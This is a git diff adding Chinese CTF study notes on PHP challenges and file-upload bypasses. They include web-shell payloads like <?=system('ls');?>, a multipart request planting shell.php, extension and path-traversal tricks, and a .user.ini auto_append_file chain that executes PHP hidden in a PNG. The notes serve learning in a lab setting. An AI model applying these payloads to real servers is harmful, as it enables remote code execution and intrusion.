@@ -2927,5 +2927,370 @@ a[]=1&b[]=2                              ← ④ 请求体 Body
 - 数组是 PHP 里的**复合结构**（一组键值对的集合），不是一段连续字节，没有办法直接塞进哈希函数；
 - 代码没做序列化就把数组丢给 `md5()`，函数返回 `null`，两边 `null === null` 被绕过。
 
-顺带记：序列化（serialize）是把数组 / 对象转成可存储的字符串形式，属于可逆操作；MD5 哈希是单向不可逆，两者别搞混了。
+顺带记一下：序列化（serialize）是把数组 / 对象转成可存储的字符串形式，属于可逆操作；MD5 哈希是单向不可逆，两者别搞混了。
 </font>
+
+## 98
+### 1.源码
+![alt text](image-74.png)
+```php
+// ① Cookie 隔间 —— 对应第 3 行的 $_COOKIE['flag']
+document.cookie = "flag=flag; path=/";
+
+// ② 一次性发请求：URL 隔间 + body 隔间 + 请求头隔间
+fetch("/?a=1", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Flag": "flag"                    // → $_SERVER['HTTP_FLAG']
+  },
+  body: "flag=flag"                    // → $_POST['flag']
+}).then(r => r.text()).then(t => console.log(t))
+```
+![alt text](image-73.png)\
+
+
+## 99
+### 1.源码
+![alt text](image-75.png)
+### 2.流程
+用bpPOST请求?n=7shell.php
++请求头
++请求体content=<php system('ls');?>
+再用bp浏览器查看/7shell.php
+<font color="red">原理:请求post发起system，这时创建一个文件去接返回内容，查到flag所在文件，因为有
+```php
+highlight_file(__FILE__);
+```
+故需用高亮显示命令：
+```php
+conten=<?=highlight_file('flag36d.php');?>
+```
+![alt text](image-71.png)
+</font>
+
+## 文件上传漏洞
+### 151（基础）
+
+![alt text](image-77.png)
+![alt text](image-78.png)
+![alt text](image-76.png)
+![alt text](image-79.png)
+---
+### 补充知识
+#### 1.目录跳级原理
+`.` 和 `../` 在大多数场景下效果一样，但用法完全不同。
+
+##### `..` 是一个「目录」本身
+
+```
+..   =  上一级目录这个"东西"
+```
+
+**它本身就是完整路径。** 所以：
+
+```
+ls ..      →  对上一级目录执行 ls           ✅
+cat ..     →  对上一级目录执行 cat（会报错，目录不能读） 
+```
+
+**`..` 后面不接斜杠，它只代表 “那个目录”。**
+
+##### `../` 是「上一级 + 往下走」
+
+```
+../  =  上一级目录 + 一个路径分隔符
+```
+
+**末尾那个 `/` 表示 “从这一级继续往下走”。** 因此：
+
+```
+../flag.php    →  从上一级开始，进入 flag.php      ✅ 完整路径
+../            →  上一级（末尾斜杠只是强调"这是目录"）
+```
+
+**`../` 必须带内容才有实际路径意义；否则它和 `..` 指向同一个东西。**
+
+##### 对照表
+
+表格
+
+| 写法 | 含义 | 结果 |
+| --- | --- | --- |
+| `ls ..` | 列出上一级目录内容 | ✅ |
+| `ls ../` | 同上（末尾 `/` 无区别） | ✅ **一模一样** |
+| `cat ../flag.php` | 读上一级里的 flag.php | ✅ |
+| `cat ..flag.php` | 找一个名叫 `..flag.php` 的文件 | ❌ 没这个文件 |
+| `ls ../..` | 上两级 | ✅ |
+| `cd ../` | 移动到上一级 | ✅ |
+
+##### 核心规则
+
+```
+..        →  一个目录（上一级）
+../xxx    →  上一级里的 xxx
+../       →  上一级（和 .. 同义）
+```
+
+**区别在于 `..` 后面是否接东西：**
+
+- `..` 后面**什么都不接** → 它就是 “上一级”
+- `..` 后面**接 `/` 再接名字** → 表示 “从上一级往下找 xxx”
+
+**`..` 结束后如果直接紧跟文件名（不加 `/`），会被当成分隔符错误，`..flag.php` 会被当成一个名为 “..flag.php” 的文件，而不是 “上一级的 flag.php”。**
+
+##### 一句话
+
+> 
+> **`..` 是 “楼上一层” 这个位置；`../` 是 “上到楼上一层，再走向某个房间”。单独用 `./` 和 `..` 谁带不带斜杠都指向同一层；`../` 的意义只在后面接了东西时才完整。**
+
+
+---
+### 源码读取
+| 写法 | 依赖 | 适用 |
+| --- | --- | --- |
+| `<?=highlight_file('x.php')?>` | PHP 函数 | **读源码首选** |
+| `<?=file_get_contents('x.php')?>` | PHP 函数 | 读纯文本，不带上色 |
+| `<?=system('cat x.php')?>` | shell + cat | 读文本，但环境依赖多 |
+| `<?=show_source('x.php')?>` | PHP 函数 | `highlight_file` 的别名，完全等价 |
+
+
+| 写法 | 类别 | 它做的事 |
+| --- | --- | --- |
+| `highlight_file('x.php')` | 读文本 | 读源码 → 上色 → 输出 |
+| `show_source('x.php')` | 读文本 | 与上一行完全等价（同一个函数两个名字） |
+| `file_get_contents('x.php')` | 读文本 | 读源码 → **返回字符串**，不输出 |
+| `readfile('x.php')` | 读文本 | 读源码 → 直接输出 |
+| `system('cat x.php')` | 调外部命令 | fork 子进程 → 执行 cat → 输出 |
+| `include('x.php')` | **执行** | 把文件当 PHP 代码跑一遍 |
+
+#### 二、核心对照表
+
+表格
+
+| 写法 | 谁在执行 | 读到的内容如何处理 | 是否输出 | 返回值 |
+| --- | --- | --- | --- | --- |
+| `highlight_file()` | PHP 进程 | 加 HTML 着色后写进输出流 | ✅ 自带输出 | `true` / `false` |
+| `show_source()` | PHP 进程 | 同上（同一个函数） | ✅ 自带输出 | `true` / `false` |
+| `file_get_contents()` | PHP 进程 | 把全文变成字符串返回 | ❌ 不输出 | 字符串 / `false` |
+| `readfile()` | PHP 进程 | 直接写进输出流 | ✅ 自带输出 | 字节数 / `false` |
+| `system('cat')` | **shell 子进程** | 子进程 stdout 打到页面 | ✅ 自带输出 | 最后一行 / `false` |
+| `exec('cat')` | **shell 子进程** | 捕获到数组，不自动输出 | ❌ 默认不输出 | 最后一行 / `false` |
+| `passthru('cat')` | **shell 子进程** | 原样输出（含二进制） | ✅ 自带输出 | `null` |
+| `include()` | PHP 进程 | **当代码执行**，不是读 | 看文件里有没有 echo | 文件返回值 |
+
+
+```
+POST /upload.php HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXX
+
+----WebKitFormBoundaryXXX
+Content-Disposition: form-data; name="file"; filename="shell.php"   ← 名字
+Content-Type: image/png                                             ← 自称
+
+<?=system('ls');?>                                                  ← body（货物）
+----WebKitFormBoundaryXXX--
+\
+
+
+body 内容  →  写进  /upload/shell.php
+文件名     →  由 filename="..." 决定
+
+
+\
+filename="shell.php"  →  决定文件"叫什么"
+<?=system('ls');?>    →  决定文件"里面装什么"
+
+
+\
+第一步  上传（写）
+   POST /upload.php                  ← 请求的是"处理脚本"
+   body = 货物
+   filename = 货物的名字
+        ↓
+   服务器把 body 落到 /upload/shell.php
+
+第二步  访问（读/执行）
+   GET /upload/shell.php             ← 请求的是"那个文件"
+   没有 body
+        ↓
+   服务器执行 /upload/shell.php，把结果返回浏览器
+\
+
+
+POST /upload.php       ← URL 是 upload.php，所以是"交给处理脚本"
+body: 代码
+
+GET /upload/shell.php  ← URL 是 shell.php，所以是"请求那个文件"
+没有 body
+
+
+
+\URL 路径  →  决定"去哪个房间"
+body      →  决定"往房间里放什么"
+
+POST /upload.php   →  去"收件室"，把 body 这个箱子放下
+GET /upload/shell.php  →  去"仓库"，把那箱子拿出来用
+
+
+\
+
+
+端到端的顺序是：先 POST 放箱子（文件名由 filename 决定，内容由 body 决定），再 GET 取箱子（服务器按后缀决定是执行还是给你下载）。
+
+```
+---
+
+
+## 152
+解法一样
+![alt text](image-80.png)
+![alt text](image-81.png)
+## 153
+![alt text](image-82.png)
+##### 1.**`\u6587\u4ef6\u7c7b\u578b\u4e0d\u5408\u6cd5` 就是「文件类型不合法」。** 上传被直接拒绝了，所以 `/upload/shell.php` 是 404。
+##### 2.查询上级目录被拒，证明多加了一层文件名后缀校验
+#### 2.换尾缀，看能否绕过
+![alt text](image-83.png)
+##### 1.<font color="red">成功绕过，但服务器不解析这些后缀只是下载而不是解析。
+也可以得出，后端是黑名单校验
+黑名单的意思是「只禁止一列固定名字」，而 `php5`、`phtml` 这些名字不在这个列表里，自然就放过了。
+</font>
+
+##### 2.原因
+`Server: nginx/1.20.1` 这一行说明了原因：nginx 只按自己配置里的规则判断 “哪些后缀算 PHP”，`.php5`、`.phtml` 不在它的匹配列表里，所以这些文件会被当作普通文件返回，浏览器看到不能显示，就弹出下载。
+
+### 2.换多重尾缀
+##### 1.原理
+```php
+filename="shell.php.jpg"
+    ↓                          ↓
+后端取最后一个点：jpg      nginx 找 .php 结尾
+    → 不在黑名单，过          → if 配置是宽松匹配，就执行
+```
+##### 1.结果返回静态页面
+![alt text](image-84.png)
+证明
+<font color="red">**虽然文件名里包含 `.php`，但 nginx 没有把它交给 PHP；它按 `.png`、`.jpg` 的结尾把文件当作静态文件返回。** 这说明 nginx 的匹配规则是「必须以 `.php` 结尾」：
+</font>
+
+### 3.思路
+##### 1.就是如何解决，服务器不会解析.php文件但nginx又只匹配.php
+### 4.解法一
+#### 1.用.user.ini尾缀让服务器再任何 PHP 文件执行之前，先执行我的内容
+
+**难点在于 `.user.ini` 生效的目录：它只对「自己所在目录及子目录」里的 PHP 脚本生效。** `/upload/` 下没有会被执行的 php 文件，所以要把 `.user.ini` 写到根目录：
+filename="../.user.ini"        ← 路径穿越，靠后端没过滤../
+
+
+---
+
+##### 2.假如成功<font color="red">
+为什么url访问目标是 `index.php`，而不是 `shell.png`
+
+**因为 `.user.ini` 的作用是 “给 PHP 加默认前置文件”，它需要被一个 PHP 请求读取。且服务器只认index.php这一个php文件故需用他当触发器**
+```
+index.php   是根目录唯一的"会执行"的 PHP 文件   →  拿它当触发器
+shell.png   是真正的载荷（PHP 代码）body里           →  被当触发器的前置文件执行
+
+`shell.png`代码`.png` 能过黑名单，文件能落到磁盘`.user.ini`配置`.ini` 能过黑名单，负责指明 “前置谁”`index.php`触发器服务器本来就执行它，这是唯一的 “开机键”
+```
+
+---
+![alt text](image-85.png)
+但是返回.user.ini
+<font color="red">证明路径穿越被过滤了
+
+#### 2.试试双写....//（假如只过滤一次../还会剩一个../）`msg` 的字符串形状，就是后端过滤逻辑的 “指纹”。
+</font>
+##### 1.一样被过滤
+![alt text](image-86.png)
+
+![alt text](image-87.png)
+```
+https://ada81ef9-.../upload.php   →  Server: nginx/1.20.1   （应用服务，PHP 在这）
+https://ada81ef9-.../upload/.../  →  nginx/1.16.1            （另一个服务）
+```
+### 5.完整解法
+```
+第一发
+    POST /upload.php
+    filename="shell.png"    Content-Type: image/png
+    body: <?=highlight_file('/var/www/html/flag.php');?>
+
+第二发
+    POST /upload.php
+    filename=".user.ini"    Content-Type: image/png
+    body: auto_append_file=shell.png//auto_prepend_file=shell.png
+
+然后去喝杯水，等 5 分钟
+
+第三发
+    GET /upload/index.php
+```
+```
+① POST shell.png
+        │
+        └─→ 磁盘出现 /upload/shell.png（内容 = <?=...?>）
+
+② POST .user.ini
+        │
+        └─→ 磁盘出现 /upload/.user.ini（内容 = auto_append_file=shell.png）
+
+③ GET /upload/index.php
+        │
+        └─→ php-fpm 启动：
+              1. 检查 /upload/ 目录有没有 .user.ini   ← 缓存！300 秒才查一次
+              2. 有 → 按配置 append shell.png → 执行 shell.png 里的代码 → 输出
+              3. 没有 → 只执行 index.php 自己 → 输出 "nothing here"
+```
+#### 3.服务器完整处理流程
+```
+① 磁盘上摆好三样：
+     /upload/index.php      题目预置，内容是 "nothing here"
+     /upload/.user.ini      你写的配置
+     /upload/shell.png      你放的载荷
+
+② 你发 GET /upload/index.php
+     ↓
+③ nginx 看后缀是 .php → 交给 php-fpm
+     ↓
+④ php-fpm 处理 index.php 之前，先扫这个目录的 .user.ini
+     ↓
+⑤ 读到 auto_append_file=shell.png
+     ↓
+⑥ 执行 index.php（输出 "nothing here"）
+     再把 shell.png 的内容追加进来执行
+     ↓
+⑦ shell.png 的内容是 <?=highlight_file('/var/www/html/flag.php');?>
+     → 输出 flag.php 的源码
+     ↓
+⑧ 最终页面 = "nothing here" + flag 源码
+```
+#### 4.php-fpm是什么
+```
+nginx        负责判断：“这个请求该谁处理”
+php-fpm      负责真正执行 php 脚本
+
+浏览器 → nginx → 看后缀是 .php → 通过 FastCGI 协议把请求转给 php-fpm
+                                    → php-fpm 启动一个 PHP 进程去执行
+                                    → 结果原样交回 nginx
+                                    → nginx 回给浏览器
+```
+#### 5.处理index.php之前会先扫一遍目录
+```
+请求进来
+  ↓
+php-fpm 定位脚本 = /upload/index.php
+  ↓
+从 /upload/ 目录开始，向上扫到 docroot，找 .user.ini  ← 这一步必须先做
+  ↓
+把找到的配置合进当前请求的配置表
+  ↓
+现在才执行 index.php（按新配置：先 prepend/append shell.png）
+```
+
+### 6.原因简述(从里往外设，从外往里剥)
+
+访问 `/upload/index.php` 时，PHP 会先读取同目录的 `.user.ini`，按里面的 `auto_append_file=shell.png` 这条配置，在 index.php 执行完之后，再把 `shell.png` 的内容接上来一起执行；而 `shell.png` 的内容是读 flag 的代码，所以最终能看到 flag。
+![alt text](image-88.png)
